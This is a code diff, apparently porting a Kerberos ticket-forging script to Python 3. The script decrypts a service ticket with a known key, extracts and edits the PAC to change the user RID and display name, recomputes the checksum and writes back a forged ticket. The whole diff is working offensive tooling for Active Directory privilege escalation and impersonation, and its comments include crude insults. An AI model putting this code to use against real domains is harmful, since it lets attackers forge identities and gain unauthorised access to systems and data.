@@ -38,10 +38,10 @@ def updatetimestampsserverticket(ticket, authtime=None, starttime=None, endtime=
 	# DIAF
 	#  -Tim
 	# P.S. Suck it
-	ticket.getComponentByPosition(5)._value = useful.GeneralizedTime(authtime)
-	ticket.getComponentByPosition(6)._value = useful.GeneralizedTime(starttime)
-	ticket.getComponentByPosition(7)._value = useful.GeneralizedTime(endtime)
-	ticket.getComponentByPosition(8)._value = useful.GeneralizedTime(renewtiltime)
+	ticket.getComponentByPosition(5)._value = str(useful.GeneralizedTime(authtime))
+	ticket.getComponentByPosition(6)._value = str(useful.GeneralizedTime(starttime))
+	ticket.getComponentByPosition(7)._value = str(useful.GeneralizedTime(endtime))
+	ticket.getComponentByPosition(8)._value = str(useful.GeneralizedTime(renewtiltime))
 
 	return ticket
 
@@ -102,9 +102,9 @@ def getpac(key, rawticket, debug=False, verbose=False):
 	updatetimestampsserverticket(decserverticket, str(decserverticket[5]), str(decserverticket[6]), str(decserverticket[7]), str(decserverticket[8]))
 
 	adifrelevant, extra = decoder.decode(decserverticket[9][0][1])
-	pac = str(adifrelevant.getComponentByPosition(0).getComponentByPosition(1))
+	pac = adifrelevant.getComponentByPosition(0).getComponentByPosition(1)
 
-	return pac
+	return bytearray(pac)
 
 def updatepac(key, rawticket, pac, debug=False, verbose=False):
 	# attempt decoding of ticket
@@ -137,7 +137,7 @@ def updatepac(key, rawticket, pac, debug=False, verbose=False):
 	adifrelevant, extra = decoder.decode(decserverticket[9][0][1])
 
 
-	chksum = kerberos.chksum(key, '\x11\x00\x00\x00', pac)
+	chksum = kerberos.chksum(key, b'\x11\x00\x00\x00', pac)
 	#print 'newchecksum:  %s' %  chksum.encode('hex')
 
 	# repair server checksum
@@ -210,12 +210,12 @@ if __name__ == '__main__':
 	# read the ticket from the file
 	fullraw = args.infile.read()
 	args.infile.close()
-
 	# do the rewrite
 	#newticket = rewriteticket(key, fullraw,  debug=args.debug, verbose=args.verbose)
 
-	pac = getpac(key, fullraw)
-	pacobj = PAC.PAC(pac)
+	pac_str = getpac(key, fullraw)
+
+	pacobj = pac.PAC(pac=pac_str)
 
 	# change user rid
 	if args.userrid:
@@ -232,8 +232,8 @@ if __name__ == '__main__':
 		pacobj.PacLoginInfo.DisplayName = args.username.encode('utf-16le')
 		
 
-	pac = pacobj.encode()
-	newticket = updatepac(key, fullraw, pac)
+	pac_str = pacobj.encode()
+	newticket = updatepac(key, fullraw, pac_str)
 
 	if args.username:
 		updateusernameinencpart(key, newticket, args.username)
